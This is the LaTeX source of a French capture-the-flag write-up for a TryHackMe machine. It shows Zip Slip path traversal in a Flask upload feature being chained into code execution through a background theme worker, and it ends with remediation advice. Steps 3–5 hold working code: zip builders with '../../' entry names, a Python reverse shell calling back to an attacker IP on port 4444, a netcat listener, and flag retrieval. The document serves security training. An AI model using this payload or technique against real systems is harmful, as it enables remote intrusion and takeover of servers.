\documentclass[11pt,a4paper]{article}

% ============================================================
% Mise en page
% ============================================================
\usepackage[margin=2.4cm]{geometry}
\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage{xcolor}
\usepackage{fancyhdr}
\usepackage{titlesec}
\usepackage{enumitem}
\usepackage{tcolorbox}
\usepackage{listings}
\usepackage{hyperref}
\usepackage{amssymb}
\usepackage{tabularx}
\usepackage{array}
\usepackage{booktabs}
\tcbuselibrary{skins,breakable}

% ---- Palette ----
\definecolor{navy}{HTML}{1A3A6B}
\definecolor{gold}{HTML}{C9970A}
\definecolor{codebg}{HTML}{0D1117}
\definecolor{codefg}{HTML}{E6EDF3}
\definecolor{codegreen}{HTML}{7EE787}
\definecolor{codegray}{HTML}{8B949E}
\definecolor{codeorange}{HTML}{FFA657}
\definecolor{codepink}{HTML}{FF7B72}
\definecolor{boxwarn}{HTML}{FFF3F3}
\definecolor{boxwarnb}{HTML}{E0A0A0}
\definecolor{boxok}{HTML}{EAF3FB}
\definecolor{boxokb}{HTML}{1A3A6B}
\definecolor{boxkey}{HTML}{FEF3D6}
\definecolor{boxkeyb}{HTML}{C9970A}

% ---- Titres ----
\titleformat{\section}
  {\Large\bfseries\color{navy}}
  {\thesection}{0.6em}{}[{\color{gold}\titlerule[1.2pt]}]
\titleformat{\subsection}
  {\large\bfseries\color{navy}}
  {\thesubsection}{0.6em}{}
\titlespacing*{\section}{0pt}{1.6em}{0.9em}
\titlespacing*{\subsection}{0pt}{1.3em}{0.6em}

% ---- En-tetes ----
\pagestyle{fancy}
\fancyhf{}
\renewcommand{\headrulewidth}{0.4pt}
\fancyhead[L]{\small\color{navy}\textbf{TryHackMe} --- Writeup}
\fancyhead[R]{\small\color{codegray}Zip Slip \& RCE via worker}
\fancyfoot[C]{\small\thepage}

% ---- Code listings ----
\lstdefinestyle{term}{
  backgroundcolor=\color{codebg},
  basicstyle=\ttfamily\footnotesize\color{codefg},
  breaklines=true,
  breakatwhitespace=false,
  columns=fullflexible,
  keepspaces=true,
  frame=single,
  framerule=0pt,
  rulecolor=\color{codebg},
  framesep=8pt,
  xleftmargin=4pt,
  xrightmargin=4pt,
  showstringspaces=false,
  commentstyle=\color{codegray}\itshape,
  keywordstyle=\color{codeorange}\bfseries,
  stringstyle=\color{codegreen},
  identifierstyle=\color{codefg},
  literate=
    {é}{{\'e}}1 {è}{{\`e}}1 {ê}{{\^e}}1 {à}{{\`a}}1 {ù}{{\`u}}1
    {É}{{\'E}}1 {È}{{\`E}}1 {î}{{\^i}}1 {ç}{{\c c}}1 {œ}{{\oe}}1,
}
\lstset{style=term}

\newtcolorbox{keyinsight}[1][]{
  colback=boxkey, colframe=boxkeyb, boxrule=0.8pt, arc=2pt,
  left=8pt, right=8pt, top=6pt, bottom=6pt,
  fonttitle=\bfseries, coltitle=black,
  title={Idee cle}, #1
}
\newtcolorbox{deadend}[1][]{
  colback=boxwarn, colframe=boxwarnb, boxrule=0.8pt, arc=2pt,
  left=8pt, right=8pt, top=6pt, bottom=6pt,
  fonttitle=\bfseries, coltitle=black,
  title={Piste inutile (a eviter)}, #1
}
\newtcolorbox{noteok}[1][]{
  colback=boxok, colframe=boxokb, boxrule=0.8pt, arc=2pt,
  left=8pt, right=8pt, top=6pt, bottom=6pt,
  fonttitle=\bfseries\color{navy}, coltitle=navy,
  #1
}

\hypersetup{
  colorlinks=true, linkcolor=navy, urlcolor=navy, citecolor=navy,
  pdftitle={Writeup : Zip Slip vers RCE -- Shoreline Display (TryHackMe)},
  pdfauthor={Assistant Claude},
}

\setlist[itemize]{leftmargin=1.4em}
\setlist[enumerate]{leftmargin=1.6em}

\begin{document}

% ============================================================
% Page de titre
% ============================================================
\begin{titlepage}
\centering
\vspace*{2.2cm}
{\Huge\bfseries\color{navy} Shoreline Display\par}
\vspace{0.4cm}
{\Large\color{gold} Zip Slip vers execution de code via un worker de themes\par}
\vspace{1.6cm}

{\large\bfseries\color{navy} Machine TryHackMe --- Byte Lotus / Room Service\par}
{\large Upload de zip, extraction non securisee, execution differee\par}

\vspace{2.4cm}
\begin{tcolorbox}[colback=boxok, colframe=boxokb, width=0.82\textwidth, arc=3pt, boxrule=1pt]
\textbf{Cadre.} Machine de la plateforme TryHackMe, resolue dans un
environnement de laboratoire isole et autorise a cet effet. Ce document
presente le \textbf{chemin direct} vers le flag -- la version courte,
sans repasser par les hypotheses testees en cours de route qui n'ont
rien donne.
\end{tcolorbox}

\vfill
{\small\color{codegray} Document genere le \today\par}
\end{titlepage}

\tableofcontents
\newpage

% ============================================================
\section{Contexte}

L'application "Shoreline Display" (Byte Lotus) est un tableau de bord
de conciergerie : un formulaire permet d'uploader un fichier
\texttt{.zip} appele \textbf{shell}, qui doit contenir un manifeste
\texttt{shell.json} listant des \textbf{assets} (images, CSS). Le texte
de la page precise deux choses, deja visibles dans le HTML avant meme
la moindre requete offensive :

\begin{quotation}
\noindent\itshape
"A shell may include optional \textbf{automation hooks} --- the
\textbf{theme worker} applies these for you shortly after the shell
comes ashore [...] Allowed asset types: png jpg gif svg css json."
\end{quotation}

\begin{keyinsight}
Cette phrase est l'indice le plus important du challenge, et elle est
donnee gratuitement des la premiere page. Elle dit explicitement :
\begin{itemize}
  \item il existe un \textbf{processus separe et asynchrone} (le
        "theme worker") qui traite chaque shell \emph{apres} l'upload ;
  \item ce processus applique des \textbf{"hooks"} -- un mecanisme
        d'automatisation non documente plus en detail.
\end{itemize}
Le reflexe a avoir : ce n'est probablement pas un champ JSON a deviner
dans \texttt{shell.json} (bien que ce soit tentant), mais plutot un
\textbf{repertoire que le worker scanne sur le disque}. La suite du
challenge consiste a le prouver et a le localiser.
\end{keyinsight}

% ============================================================
\section{Chemin rapide vers le flag}

\subsection{Etape 1 --- Etablir une baseline}

On uploade un zip minimal pour observer le comportement "propre" :

\begin{lstlisting}[language=bash]
mkdir -p mon_shell/assets
cat > mon_shell/shell.json <<'EOF'
{"name": "test-shell", "assets": ["assets/style.css"]}
EOF
echo "body{background:#000}" > mon_shell/assets/style.css
cd mon_shell && zip -r ../test.zip . && cd ..

curl -s -b "session=<cookie>" -F "shell=@test.zip" \
  http://<cible>:5000/upload
\end{lstlisting}

Reponse : \texttt{Shell 'test-shell' brought ashore. Stored at
shells/2d6da9a56a86/ [...]}. Deux informations cle :

\begin{itemize}
  \item le zip est extrait sous un chemin previsible :
        \texttt{shells/<id-hex>/} ;
  \item les fichiers extraits sont \textbf{servis tels quels} en HTTP :
        \texttt{curl http://<cible>:5000/shells/<id>/shell.json} renvoie
        le JSON en clair, sans transformation.
\end{itemize}

\subsection{Etape 2 --- La whitelist d'extensions est cosmetique}

La page annonce une liste blanche d'assets (\texttt{png jpg gif svg css
json}). On verifie si elle s'applique reellement au \textbf{contenu du
zip}, ou seulement au champ \texttt{assets} du manifeste : on ajoute des
fichiers \texttt{.sh} au zip \textbf{sans} les declarer dans
\texttt{assets} :

\begin{lstlisting}[language=bash]
# dans le zip, a la racine : hook.sh, install.sh, setup.sh, etc.
# shell.json ne les mentionne PAS dans "assets"
curl -s http://<cible>:5000/shells/<id>/hook.sh   # -> 200 !
\end{lstlisting}

\begin{noteok}
\textbf{Conclusion.} La whitelist ne valide que ce qui est
\emph{declare} dans \texttt{shell.json} ; elle ne filtre en rien ce qui
est physiquement present dans l'archive. N'importe quel type de fichier
passe a l'extraction.
\end{noteok}

\subsection{Etape 3 --- Confirmer le Zip Slip}

On teste si des noms d'entree contenant \texttt{../} dans le zip
permettent d'ecrire \textbf{en dehors} du dossier du shell. Pour le
verifier sans avoir besoin d'executer quoi que ce soit, on vise un
dossier dont on connait deja l'existence et l'URL publique : le dossier
\texttt{static/} de Flask (qui sert le CSS du site lui-meme, sans
rapport avec les shells).

\begin{lstlisting}[language=python]
import zipfile
zf = zipfile.ZipFile("slip.zip", "w")
zf.write("shell.json", "shell.json")
zf.write("assets/style.css", "assets/style.css")
zf.write("marker.txt", "../static/zipslip_d1.txt")        # 1 niveau
zf.write("marker.txt", "../../static/zipslip_d2.txt")      # 2 niveaux
zf.write("marker.txt", "../../../static/zipslip_d3.txt")   # 3 niveaux
zf.close()
\end{lstlisting}

Apres upload, on teste les trois profondeurs :

\begin{lstlisting}[language=bash]
curl -s -o /dev/null -w "%{http_code}\n" http://<cible>:5000/static/zipslip_d1.txt  # 404
curl -s -o /dev/null -w "%{http_code}\n" http://<cible>:5000/static/zipslip_d2.txt  # 200 !
curl -s -o /dev/null -w "%{http_code}\n" http://<cible>:5000/static/zipslip_d3.txt  # 404
\end{lstlisting}

\begin{keyinsight}
\texttt{static/} sert ici d'\textbf{oracle de calibration} : le seul
niveau qui repond \texttt{200} indique le nombre exact de \texttt{../}
necessaires pour remonter du dossier d'extraction
(\texttt{shells/<id>/}) jusqu'a la racine de l'application. Ici,
\textbf{2 niveaux} suffisent : \texttt{shells/<id>/../.. = racine de
l'app}, et \texttt{racine/static/} existe reellement. On a donc, sans
jamais avoir execute de commande, la preuve d'une ecriture de fichier
arbitraire ET la profondeur exacte a utiliser.
\end{keyinsight}

\subsection{Etape 4 --- Livrer le payload dans le bon dossier}

Avec la profondeur validee (2 niveaux), et l'indice textuel du
"theme worker" qui "applique des hooks", l'hypothese naturelle est
qu'un repertoire partage \texttt{hooks/} existe a la racine de
l'application (au meme niveau que \texttt{static/}), scanne
periodiquement par un script separe. On y depose un reverse shell
Python via le meme Zip Slip :

\begin{lstlisting}[language=python]
import zipfile
zf = zipfile.ZipFile("rev.zip", "w")
zf.write("shell.json", "shell.json")           # manifeste minimal valide
zf.write("assets/style.css", "assets/style.css")
zf.write("pwn.py", "../../hooks/pwn.py")       # meme profondeur qu'a l'etape 3
zf.close()
\end{lstlisting}

Contenu de \texttt{pwn.py} :

\begin{lstlisting}[language=python]
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("<IP_ATTAQUANT>", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
\end{lstlisting}

On ouvre un listener puis on uploade :

\begin{lstlisting}[language=bash]
nc -lvnp 4444 &
curl -s -b "session=<cookie>" -F "shell=@rev.zip" \
  http://<cible>:5000/upload
\end{lstlisting}

Quelques secondes plus tard, le \textbf{theme worker} scanne le
repertoire partage, trouve \texttt{pwn.py} et l'execute --- la
connexion arrive dans le listener, sous l'utilisateur applicatif
(\texttt{roomservice}).

\subsection{Etape 5 --- Recuperer le flag}

\begin{lstlisting}[language=bash]
$ id
uid=996(roomservice) gid=996(roomservice) groups=996(roomservice)
$ find /home /root /var/www /opt /srv -iname "*flag*" 2>/dev/null
/home/roomservice/flag.txt
$ cat /home/roomservice/flag.txt
THM{z1p_sl1pp3d_1nt0_a_sh3ll}
\end{lstlisting}

\begin{tcolorbox}[colback=black, colframe=gold, coltext=codegreen, arc=2pt,
  fonttitle=\bfseries\color{white}, coltitle=white, title=Flag obtenu]
\ttfamily THM\{z1p\_sl1pp3d\_1nt0\_a\_sh3ll\}
\end{tcolorbox}

% ============================================================
\section{Questions frequentes sur ce challenge}

\subsection{Un scan gobuster/ffuf aurait-il revele le chemin ?}

Non. \texttt{gobuster}/\texttt{ffuf} testent des \textbf{URLs HTTP} et
regardent les codes de reponse. Le dossier \texttt{hooks/} qui permet le
RCE n'est \textbf{jamais expose en HTTP} : il est lu directement sur
le disque par un script separe (\texttt{theme\_worker.py}), invisible
depuis le web tant qu'on n'a pas deja une execution de code pour le
voir. Un fuzzing d'URL sur cette machine ne remonte que les routes deja
connues (\texttt{/login}, \texttt{/dashboard}, \texttt{/logout},
\texttt{/upload}) -- confirme empiriquement pendant la resolution.

\begin{noteok}
Le vrai raccourci n'est pas un outil de fuzzing web, mais la
\textbf{lecture attentive du texte de la page} ("automation hooks" +
"theme worker applies these... shortly after") combinee a la
\textbf{preuve d'ecriture arbitraire} (Zip Slip). Le fuzzing utile ici
aurait ete un fuzzing de \emph{noms de repertoires plausibles pour un
theme worker} (\texttt{hooks}, \texttt{scripts}, \texttt{tasks}...),
pas un fuzzing d'URLs.
\end{noteok}

\subsection{C'est quoi \texttt{static/} exactement ?}

C'est le dossier standard de Flask (\texttt{app.static\_folder}, par
defaut \texttt{<racine\_app>/static/}), qui sert les fichiers
statiques du site lui-meme -- ici, la feuille de style
\texttt{/static/style.css} de la dashboard. Il n'a \textbf{aucun lien}
avec les shells uploades. Il a ete utilise uniquement comme
\textbf{point de reference connu et deja accessible en HTTP}, pour
calibrer par l'exemple la profondeur de traversal necessaire avant de
tenter la meme technique vers un dossier qu'on ne peut pas verifier
directement (\texttt{hooks/}, qui n'a pas de route HTTP dediee).

% ============================================================
\section{Analyse et remediation}

\begin{itemize}
  \item \textbf{Cause racine 1 (Zip Slip)} : l'extraction du zip
        n'assainit pas les noms d'entree ; une entree contenant
        \texttt{../} peut ecrire en dehors du dossier de destination
        prevu.
  \item \textbf{Cause racine 2 (worker de confiance implicite)} : un
        processus separe execute sans verification tout fichier trouve
        dans un repertoire partage (\texttt{hooks/}), alimente
        indirectement par une fonctionnalite utilisateur (l'upload de
        shells).
  \item \textbf{Cause racine 3 (whitelist cosmetique)} : la validation
        des types de fichiers ne porte que sur le manifeste declare,
        pas sur le contenu reel de l'archive.
  \item \textbf{Corrections recommandees} :
    \begin{enumerate}
      \item Valider chaque nom d'entree du zip avant extraction
            (rejeter tout chemin resolu hors du repertoire cible --
            \texttt{os.path.realpath} + verification de prefixe).
      \item Ne jamais faire executer par un worker automatique un
            fichier issu, meme indirectement, d'un contenu uploade par
            un utilisateur, sans sandboxing strict (conteneur ephemere,
            utilisateur non privilegie, pas d'acces reseau sortant).
      \item Valider le contenu \textbf{reel} de chaque fichier de
            l'archive (type MIME reel, pas seulement l'extension
            declaree dans un manifeste JSON controle par l'attaquant).
    \end{enumerate}
\end{itemize}

\end{document}
